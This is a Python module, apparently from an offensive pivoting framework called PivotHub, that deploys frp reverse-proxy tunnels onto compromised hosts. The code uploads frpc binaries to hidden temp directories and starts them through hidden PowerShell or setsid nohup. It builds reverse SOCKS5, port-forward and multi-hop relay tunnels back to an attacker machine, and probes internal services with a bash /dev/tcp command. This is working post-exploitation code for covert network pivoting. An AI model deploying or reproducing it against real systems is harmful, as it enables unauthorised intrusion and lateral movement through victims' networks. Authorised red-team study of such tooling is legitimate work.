"""frp 适配器：反向 Socks5 / 端口转发 / 多级中继（真实部署，TOML 配置）。

frp（fast reverse proxy）以「服务端 frps + 客户端 frpc」两件套工作：
  - 攻击机跑 frps（bindPort = 控制端口），它同时是代理端口的出口；
  - 目标机跑 frpc（serverAddr = 攻击机），用 [[proxies]] 声明要暴露的隧道。

三种链路（命令模板与 assets/js/views/proxy.js 的 frp 段一致）：
  socks   : frpc [[proxies]] plugin=socks5 remotePort=<lport>
            ⇒ 攻击机 127.0.0.1:<lport> 即一个出口在目标机的 Socks5
  portfwd : frpc [[proxies]] localIP=<thost> localPort=<tport> remotePort=<lport>
            ⇒ 攻击机 127.0.0.1:<lport> → 目标机可达的 <thost>:<tport>
  relay   : 两级 frps 链——
            ① 攻击机 frps#1（bindPort=<listen>）
            ② 上层跳板 frpc→frps#1：[[proxies]] localPort=<lport> remotePort=<lport>
               把攻击机 <lport> 回映射到跳板自身；
            ③ 上层跳板再跑 frps#2（bindPort=<relayPort>，暴露在内网口）
            ④ 本层节点 frpc→跳板 frps#2：[[proxies]] plugin=socks5 remotePort=<lport>
            ⇒ 攻击机 <lport> → 跳板 <lport> → 本层节点 Socks5

约束：lhost（攻击机地址）由调用方给出（/api/attack 配置），禁止写死 127.0.0.1；
      本机 frps 绑定地址同样取用户配置（本机联调可显式传 127.0.0.1）。
"""

from __future__ import annotations

import secrets
import subprocess
import sys
import time
from pathlib import Path

from ..config import ROOT_DIR, TOOLS_DIR
from ..session.base import SessionBase
from .base import AdapterBase, DeployResult, PidRecord, TunnelCheck
from .chisel import pick_lhost, port_open, read_banner, socks5_read_banner

REMOTE_DIR_LINUX = "/tmp/.pivothub"
REMOTE_DIR_WIN = r"%TEMP%\.pivothub"

#: 攻击机侧 frps 配置文件落地目录（本地临时，含 token，勿提交）
RUN_DIR = ROOT_DIR / ".run"


# ---- 配置文本（TOML，frp v0.52+ 仅支持 TOML，INI 已移除）----

def frps_toml(bind_addr: str, bind_port: int, token: str) -> str:
    """攻击机/跳板侧 frps 配置。"""
    return (
        "# PivotHub · frps\n"
        f'bindAddr = "{bind_addr}"\n'
        f"bindPort = {int(bind_port)}\n"
        'auth.method = "token"\n'
        f'auth.token = "{token}"\n'
        'log.level = "info"\n'
    )


def frpc_toml(server_addr: str, server_port: int, token: str, proxies: list[str]) -> str:
    """目标机侧 frpc 配置（serverAddr/serverPort + 若干 [[proxies]]）。"""
    head = (
        "# PivotHub · frpc\n"
        f'serverAddr = "{server_addr}"\n'
        f"serverPort = {int(server_port)}\n"
        'auth.method = "token"\n'
        f'auth.token = "{token}"\n'
        "loginFailExit = false\n"
    )
    body = "\n\n".join(p.rstrip("\n") for p in proxies if p)
    return head + "\n" + (body + "\n" if body else "")


def proxy_socks5(name: str, remote_port: int) -> str:
    """[[proxies]]：在服务端暴露一个 Socks5（出口为目标机）。"""
    return (
        "[[proxies]]\n"
        f'name = "{name}"\n'
        'type = "tcp"\n'
        f"remotePort = {int(remote_port)}\n"
        "transport.useEncryption = true\n"
        "transport.useCompression = true\n"
        "\n[proxies.plugin]\n"
        'type = "socks5"\n'
    )


def proxy_tcp(name: str, remote_port: int, local_ip: str, local_port: int) -> str:
    """[[proxies]]：在服务端暴露 <remote_port> → 客户端侧的 local_ip:local_port。"""
    return (
        "[[proxies]]\n"
        f'name = "{name}"\n'
        'type = "tcp"\n'
        f'localIP = "{local_ip}"\n'
        f"localPort = {int(local_port)}\n"
        f"remotePort = {int(remote_port)}\n"
    )


class FrpAdapter(AdapterBase):
    tool = "frp"

    def __init__(self, tools_dir: Path | None = None) -> None:
        self.tools_dir = Path(tools_dir or TOOLS_DIR)

    # ---- 命令与配置生成 ----

    def generate_config(self, *, lhost: str, server_port: int, local_port: int, auth: str,
                        link_type: str = "socks", bind: str = "0.0.0.0",
                        target_host: str = "", target_port: int = 0,
                        relay_addr: str = "", relay_port: int = 0,
                        remote_bin: str = "frpc",
                        remote_conf: str = "/tmp/.pivothub/frpc.toml",
                        server_bin: str = "frps", server_conf: str = "./frps.toml",
                        platform: str = "linux") -> dict:
        """生成 frps/frpc 的 TOML 配置文本与启动命令。

        返回键同时给出「命令」（server/target/relay）与「配置正文」
        （serverConf/targetConf/relayConf/relayServerConf），部署层据此落盘/上传。
        """
        listen = int(server_port)
        lport = int(local_port)
        rport = int(relay_port or listen)

        if link_type == "portfwd":
            target_conf = frpc_toml(
                lhost, listen, auth,
                [proxy_tcp("portfwd", lport, target_host or "127.0.0.1", int(target_port))])
        elif link_type == "relay":
            # 本层节点：连上层跳板的 frps#2，暴露 socks5
            target_conf = frpc_toml(relay_addr, rport, auth, [proxy_socks5("socks5", lport)])
        else:
            target_conf = frpc_toml(lhost, listen, auth, [proxy_socks5("socks5", lport)])

        # 上层跳板 frpc：把攻击机 <lport> 回映射到跳板自身（本层节点经跳板内网口接入）
        relay_conf = frpc_toml(lhost, listen, auth,
                               [proxy_tcp("relay", lport, "127.0.0.1", lport)])
        server_conf_text = frps_toml(bind or "0.0.0.0", listen, auth)
        relay_server_conf = frps_toml("0.0.0.0", rport, auth)

        return {
            "server": f"{server_bin} -c {server_conf}",
            "target": f"{remote_bin} -c {remote_conf}",
            "relay": f"{remote_bin} -c {remote_conf}",
            "serverConf": server_conf_text,
            "targetConf": target_conf,
            "relayConf": relay_conf,
            "relayServerConf": relay_server_conf,
            "linkType": link_type,
            "platform": platform,
        }

    # ---- 内部工具 ----

    def _bins(self, platform: str, remote_dir: str = "") -> tuple[Path, Path, str, str]:
        """返回 (攻击机 frps, 目标机 frpc, 远端目录, 远端 frpc 路径)。"""
        win = sys.platform == "win32"
        server_bin = self.tools_dir / ("frps.exe" if win else "frps_linux")
        if platform == "windows":
            d = remote_dir or REMOTE_DIR_WIN
            client_bin = self.tools_dir / "frpc.exe"
            return server_bin, client_bin, d, d.rstrip("\\") + r"\frpc.exe"
        d = remote_dir or REMOTE_DIR_LINUX
        client_bin = self.tools_dir / "frpc_linux"
        return server_bin, client_bin, d, d.rstrip("/") + "/frpc"

    def _node_dir(self, remote_dir: str, tag: str) -> str:
        """每台节点独立子目录（同机多节点/重复部署时避免二进制被占用）。"""
        safe = "".join(c for c in str(tag) if c.isalnum() or c in "-_") or "node"
        sep = "\\" if ("\\" in remote_dir or (len(remote_dir) > 1 and remote_dir[1] == ":")) else "/"
        return remote_dir.rstrip("\\/") + sep + safe

    def _upload_bytes(self, session: SessionBase, remote_path: str, data: bytes,
                      log: list[str]) -> None:
        last = ""
        for attempt in range(3):
            try:
                n = session.upload_file(remote_path, data)
                log.append(f"uploaded {n} bytes → {remote_path}"
                           + (f"（第 {attempt + 1} 次尝试）" if attempt else ""))
                return
            except Exception as e:  # 目录被占用/半写
                last = str(e)
                log.append(f"upload retry {attempt + 1}: {last[:120]}")
                time.sleep(1.5)
        raise RuntimeError(f"上传失败: {remote_path}: {last}")

    def _prepare_remote(self, session: SessionBase, remote_dir: str, remote_path: str,
                        client_bin: Path, log: list[str]) -> None:
        if session.platform == "windows":
            session.exec(f'if not exist "{remote_dir}" mkdir "{remote_dir}"', timeout=15)
        else:
            session.exec(f"mkdir -p {remote_dir}", timeout=15)
        self._upload_bytes(session, remote_path, client_bin.read_bytes(), log)
        if session.platform != "windows":
            session.exec(f"chmod +x {remote_path}", timeout=10)

    def _start_server(self, server_bin: Path, conf_path: Path) -> tuple[subprocess.Popen | None, str]:
        """攻击机侧 frps（真实子进程）。"""
        if not server_bin.exists():
            return None, f"缺少服务端二进制: {server_bin}"
        try:
            proc = subprocess.Popen(
                [str(server_bin), "-c", str(conf_path)],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                creationflags=(getattr(subprocess, "CREATE_NO_WINDOW", 0)),
            )
        except OSError as e:
            return None, f"frps 启动失败: {e}"
        time.sleep(1.0)
        if proc.poll() is not None:
            return None, "frps 秒退（端口被占用或配置错误）"
        return proc, ""

    def _spawn_background(self, session: SessionBase, cmd: str, log: list[str],
                          image: str = "frpc", log_dir: str = "",
                          exclude_pids: list[int] | None = None,
                          marker: str = "") -> tuple[bool, int | None, str]:
        """目标侧后台拉起 frpc / frps，返回真实 pid。

        marker：进程定位用的命令行唯一子串（本次部署的 auth token）——
        同机可能存在其他 frpc/frps，仅按映像名定位会认错 pid。
        """
        if session.platform == "windows":
            parts = cmd.split()
            exe, rest = parts[0], " ".join(parts[1:])
            redir = ""
            if log_dir:
                redir = (" -RedirectStandardError '" + log_dir.rstrip("\\") + "\\c.err'"
                         " -RedirectStandardOutput '" + log_dir.rstrip("\\") + "\\c.out'")
            full = ("powershell -NoP -NonI -W Hidden -Command "
                    "\"Start-Process -FilePath '" + exe + "' -ArgumentList '" + rest
                    + "' -WindowStyle Hidden" + redir + "\"")
            res = session.exec(full, timeout=45)
            log.append("exec(win): " + ((res.output or res.error or "").strip()[:120] or "(no output)"))
            exclude = set(exclude_pids or [])
            marker = marker or (rest.split()[0] if rest else image)
            for _ in range(8):
                pids = [p for p in session.find_pids_cmd(marker, image=image) if p not in exclude]
                if pids:
                    log.append(f"spawn pid={pids[-1]} marker={marker}")
                    return True, pids[-1], ""
                time.sleep(0.7)
            err = f"目标侧未发现 {image} 进程"
            if log_dir:
                tail = session.exec(f'type "{log_dir.rstrip(chr(92))}\\c.err"', timeout=12)
                if (tail.output or "").strip():
                    err += " · " + tail.output.strip().splitlines()[-1][:160]
            log.append("spawn fail: " + err)
            return False, None, err
        full = f"setsid nohup {cmd} >{REMOTE_DIR_LINUX}/c.log 2>&1 </dev/null & echo PID=$!"
        res = session.exec(full, timeout=30)
        out = (res.output or "").strip()
        log.append("exec: " + out[:120])
        if "PID=" in out:
            try:
                return True, int(out.split("PID=")[1].split()[0]), ""
            except (IndexError, ValueError):
                pass
        if res.ok:
            pids = session.find_pids(image)
            if pids:
                return True, pids[-1], ""
        return False, None, res.error or "客户端执行失败"

    def _wait_local_port(self, proc: subprocess.Popen, port: int, wait_s: int,
                         log: list[str], lhost: str = "", listen_host: str = "") -> tuple[bool, str]:
        """等目标回连：本机 local_port 可连即视为隧道建立。"""
        deadline = time.time() + max(1, wait_s)
        while time.time() < deadline:
            if proc.poll() is not None:
                return False, "frps 进程退出"
            if port_open(port):
                log.append(f"callback ok: 127.0.0.1:{port} listening")
                return True, ""
            time.sleep(1.0)
        hint = ""
        if lhost and not lhost.startswith("127.") and listen_host not in ("127.0.0.1",):
            hint = (f"；若目标机与攻击机不在同一台机器，请确认攻击机防火墙已放行 "
                    f"{listen_host}:{port} 的入站连接（Windows 首次监听会弹窗，"
                    f"未批准会生成 Block 规则 → 目标回连被静默丢弃）")
        return False, f"{wait_s}s 内未检测到回连（本机端口 {port} 未开）{hint}"

    def _write_local_conf(self, name: str, text: str) -> Path:
        RUN_DIR.mkdir(parents=True, exist_ok=True)
        p = RUN_DIR / name
        p.write_text(text, encoding="utf-8")
        return p

    def _remote_conf_path(self, remote_dir: str, platform: str, prefix: str) -> str:
        sep = "\\" if platform == "windows" else "/"
        return remote_dir.rstrip("\\/") + sep + prefix

    # ---- 主流程 ----

    def deploy(self, session: SessionBase, *, target_ip: str, link_type: str = "socks",
               lhost: str = "", server_port: int | None = None, local_port: int | None = None,
               bind: str = "0.0.0.0", target_host: str = "", target_port: int = 0,
               relay_addr: str = "", relay_port: int = 0, relay_session: SessionBase | None = None,
               wait_s: int = 45, verify: bool = True, verify_target: str = "",
               verify_port: int = 0, remote_dir: str = "", bind_host: str = "") -> DeployResult:
        """部署一条 frp 链路。link_type ∈ {socks, portfwd, relay}。

        - socks/portfwd：session = 本层节点会话
        - relay：relay_session = 上层跳板会话，session = 本层双网卡节点会话
        - bind_host：攻击机侧 frps 绑定地址（缺省取 lhost；本机联调可传 127.0.0.1）
        """
        log: list[str] = []
        if link_type not in ("socks", "portfwd", "relay"):
            return DeployResult(ok=False, stage="linkType", error=f"不支持的链路类型: {link_type}")

        platform = session.platform
        server_bin, client_bin, remote_dir, _ = self._bins(platform, remote_dir)
        if not server_bin.exists():
            return DeployResult(ok=False, stage="binary", error=f"缺少服务端二进制: {server_bin}")
        if not client_bin.exists():
            return DeployResult(ok=False, stage="binary", error=f"缺少客户端二进制: {client_bin}")
        if link_type == "relay" and relay_session is None:
            return DeployResult(ok=False, stage="relay", error="多级中继缺少上层跳板会话")

        lhost = (lhost or "").strip() or pick_lhost(target_ip)
        server_port = int(server_port or (int(local_port or 0) + 1) or 7000)
        local_port = int(local_port or (server_port - 1))
        auth = "pivothub" + secrets.token_hex(4)
        pids: list[PidRecord] = []
        hops: list[dict] = []
        listener_proc = None

        # 攻击机侧 frps#1
        listen_host = (bind_host or "").strip() or lhost or "0.0.0.0"
        conf = frps_toml(listen_host, server_port, auth)
        conf_path = self._write_local_conf(f"frps-{auth}.toml", conf)
        proc, err = self._start_server(server_bin, conf_path)
        if proc is None and listen_host not in ("0.0.0.0", "127.0.0.1"):
            log.append(f"bind {listen_host} 失败（{err}）→ 回落 0.0.0.0（本机自测/网卡未就绪）")
            conf_path.write_text(frps_toml("0.0.0.0", server_port, auth), encoding="utf-8")
            proc, err = self._start_server(server_bin, conf_path)
        if proc is None:
            return DeployResult(ok=False, stage="server", error=err, log=log)
        listener_proc = proc
        pids.append(PidRecord(pid=proc.pid, role="server", host_id="", port=server_port,
                              cmd=f"frps -c {conf_path.name}"))
        log.append(f"frps pid={proc.pid} bind={listen_host}:{server_port}")

        try:
            # ① 本层节点：上传 frpc + 写配置 + 后台执行
            my_dir = self._node_dir(remote_dir, getattr(session, "host_id", "") or "node")
            my_bin = my_dir.rstrip("\\/") + ("\\frpc.exe" if platform == "windows" else "/frpc")
            my_conf = self._remote_conf_path(my_dir, platform, f"frpc-{auth}.toml")
            self._prepare_remote(session, my_dir, my_bin, client_bin, log)

            # ② 多级中继：上层跳板 frpc（回映射）+ 跳板 frps#2（内网口）
            if link_type == "relay":
                rp = int(relay_port or server_port)
                r_plat = relay_session.platform
                r_dir = self._node_dir(remote_dir, getattr(relay_session, "host_id", "") or "relay")
                r_bin = r_dir.rstrip("\\/") + ("\\frpc.exe" if r_plat == "windows" else "/frpc")
                r_conf = self._remote_conf_path(r_dir, r_plat, f"frpc-{auth}.toml")
                self._prepare_remote(relay_session, r_dir, r_bin, client_bin, log)
                # 跳板的 frps#2 二进制（同架构）
                r_srv_bin = r_dir.rstrip("\\/") + ("\\frps.exe" if r_plat == "windows" else "/frps")
                r_srv_conf = self._remote_conf_path(r_dir, r_plat, f"frps-{auth}.toml")
                self._upload_bytes(
                    relay_session, r_srv_bin,
                    (server_bin.read_bytes()), log)
                if r_plat != "windows":
                    relay_session.exec(f"chmod +x {r_srv_bin}", timeout=10)
                relay_session.write_file(r_srv_conf, frps_toml("0.0.0.0", rp, auth))

                # 先起跳板 frps#2（暴露内网口）
                cfg_r_srv = f"{r_srv_bin} -c {r_srv_conf}"
                ok, rspid, rserr = self._spawn_background(
                    relay_session, cfg_r_srv, log, image="frps", log_dir=r_dir, marker=auth,
                    exclude_pids=[p.pid for p in pids if p.pid])
                if not ok:
                    return DeployResult(ok=False, stage="relay_server", error=rserr,
                                        pid=proc.pid, pids=[p.to_dict() for p in pids], log=log)
                pids.append(PidRecord(pid=rspid or 0, role="relay", host_id="",
                                      port=rp, cmd=cfg_r_srv))
                hops.append({"role": "跳板 frps#2（内网口控制端）",
                             "hostId": getattr(relay_session, "host_id", ""), "cmd": cfg_r_srv})

                # 再起跳板 frpc（把攻击机 <lport> 回映射到跳板）
                cfg_relay = self.generate_config(
                    lhost=lhost, server_port=server_port, local_port=local_port, auth=auth,
                    link_type="relay", relay_addr=relay_addr, relay_port=rp,
                    remote_bin=r_bin, remote_conf=r_conf, platform=r_plat)
                relay_session.write_file(r_conf, cfg_relay["relayConf"])
                log.append(f"relay conf → {r_conf}")
                ok, rpid, rerr = self._spawn_background(
                    relay_session, cfg_relay["relay"], log, image="frpc", log_dir=r_dir,
                    marker=auth, exclude_pids=[p.pid for p in pids if p.pid])
                if not ok:
                    return DeployResult(ok=False, stage="relay_upstream", error=rerr,
                                        pid=proc.pid, pids=[p.to_dict() for p in pids], log=log)
                pids.append(PidRecord(pid=rpid or 0, role="relay",
                                      host_id=getattr(relay_session, "host_id", ""),
                                      port=local_port, cmd=cfg_relay["relay"]))
                hops.append({"role": "跳板回连（回映射本层入口）",
                             "hostId": getattr(relay_session, "host_id", ""),
                             "cmd": cfg_relay["relay"]})

            cfg = self.generate_config(
                lhost=lhost, server_port=server_port, local_port=local_port, auth=auth,
                link_type=link_type, bind=bind, target_host=target_host, target_port=target_port,
                relay_addr=relay_addr, relay_port=relay_port, remote_bin=my_bin,
                remote_conf=my_conf, platform=platform)
            session.write_file(my_conf, cfg["targetConf"])
            log.append(f"frpc conf → {my_conf}")
            hops.insert(0, {"role": "攻击机 frps 监听", "hostId": "h-attacker",
                            "cmd": f"frps -c {conf_path.name}（bindPort={server_port}, 代理出口 {local_port}）"})
            hops.append({"role": {"socks": "跳板机回连（Socks5）",
                                  "portfwd": "跳板机回连（端口转发）",
                                  "relay": "本层双网卡节点回连（Socks5）"}[link_type],
                         "hostId": getattr(session, "host_id", ""), "cmd": cfg["target"]})

            ok, tpid, terr = self._spawn_background(
                session, cfg["target"], log, image="frpc", log_dir=my_dir, marker=auth,
                exclude_pids=[p.pid for p in pids if p.pid])
            if not ok:
                return DeployResult(ok=False, stage="execute", error=terr, pid=proc.pid,
                                    pids=[p.to_dict() for p in pids], log=log)
            pids.append(PidRecord(pid=tpid or 0, role="target",
                                  host_id=getattr(session, "host_id", ""),
                                  port=local_port, cmd=cfg["target"]))

            # ③ 等回连：攻击机 local_port 可连即视为隧道建立
            ok, werr = self._wait_local_port(proc, local_port, wait_s, log,
                                             lhost=lhost, listen_host=listen_host)
            if not ok:
                self._rollback(listener_proc, pids, session, relay_session)
                return DeployResult(ok=False, stage="wait_callback", error=werr,
                                    pid=proc.pid, pids=[p.to_dict() for p in pids],
                                    link_type=link_type, hops=hops, log=log)

            result = DeployResult(ok=True, pid=proc.pid, pids=[p.to_dict() for p in pids],
                                  lhost=lhost, server_port=server_port,
                                  socks_port=local_port, local_port=local_port,
                                  remote_path=my_bin, auth=auth, link_type=link_type,
                                  hops=hops, log=log)

            # ④ 隧道内真实性验证
            if verify:
                check = self.verify_tunnel(
                    link_type=link_type, local_port=local_port,
                    target_host=verify_target or target_host or target_ip,
                    target_port=verify_port or target_port or 0, session=session)
                result.verify = check
                log.append(f"verify: {check.to_dict()}")
                if not check.ok:
                    self._rollback(listener_proc, pids, session, relay_session)
                    return DeployResult(ok=False, stage="verify",
                                        error=f"隧道已建立但目标服务不可达：{check.error}",
                                        pid=None, pids=[p.to_dict() for p in pids],
                                        link_type=link_type, hops=hops, verify=check, log=log)
            return result
        except Exception as e:  # pragma: no cover - 兜底
            self._rollback(listener_proc, pids, session, relay_session)
            return DeployResult(ok=False, stage="exception", error=str(e),
                                pids=[p.to_dict() for p in pids], log=log)

    def target_reachable(self, session: SessionBase, host: str, port: int,
                         timeout: float = 15.0) -> TunnelCheck:
        """从跳板机（本层节点）真实连接目标服务 —— portfwd 的决定性验证。"""
        if session.platform == "windows":
            cmd = ('powershell -NoP -NonI -Command "try{$c=New-Object Net.Sockets.TcpClient;'
                   f"$c.Connect('{host}',{int(port)}); Write-Output 'TCP OPEN'; $c.Close()}}"
                   "catch{Write-Output 'TCP CLOSED'}\"")
        else:
            cmd = (f"(timeout 5 bash -c 'exec 3<>/dev/tcp/{host}/{int(port)} && echo TCP OPEN' 2>&1 "
                   "|| echo TCP CLOSED)")
        res = session.exec(cmd, timeout=timeout)
        out = ((res.output or "") + "\n" + (res.error or "")).upper()
        if "TCP OPEN" in out:
            return TunnelCheck(ok=True, target=f"{host}:{port}", banner="TCP OPEN（跳板机实测）",
                               ms=int(getattr(res, "ms", 0) or 0))
        detail = (res.error or res.output or "").strip().replace("\n", " ")[:80]
        return TunnelCheck(
            ok=False, target=f"{host}:{port}",
            error=f"目标服务不可达：跳板机连接 {host}:{port} 失败" + (f"（{detail}）" if detail else ""),
            ms=int(getattr(res, "ms", 0) or 0))

    def verify_tunnel(self, *, link_type: str, local_port: int,
                      target_host: str = "", target_port: int = 0,
                      session: SessionBase | None = None) -> TunnelCheck:
        """真实验证：portfwd 先在目标侧实测目标服务再查本机入口；
        socks/relay 经本机 Socks5 入口连目标服务读回显。"""
        if link_type == "portfwd":
            if session is not None and target_host and target_port:
                reach = self.target_reachable(session, target_host, int(target_port))
                if not reach.ok:
                    return reach
            ok, text = read_banner(local_port)
            return TunnelCheck(ok=ok, target=f"127.0.0.1:{local_port}",
                               banner=text if ok else "", error="" if ok else text)
        if not target_host or not target_port:
            return TunnelCheck(ok=False, error="socks/relay 验证缺少目标服务地址")
        return socks5_read_banner(local_port, target_host, int(target_port))

    def _rollback(self, proc: subprocess.Popen | None, pids: list[PidRecord],
                  session: SessionBase | None = None,
                  relay_session: SessionBase | None = None) -> None:
        """失败回滚：结束本机 frps 与已拉起的远端进程（不留孤儿）。"""
        if proc is not None:
            try:
                proc.kill()
            except Exception:
                pass
        for rec in pids:
            if not rec.pid or rec.role == "server":
                continue
            sess = relay_session if rec.role == "relay" else session
            if sess is None:
                continue
            try:
                sess.kill_pid(int(rec.pid))
            except Exception:
                pass
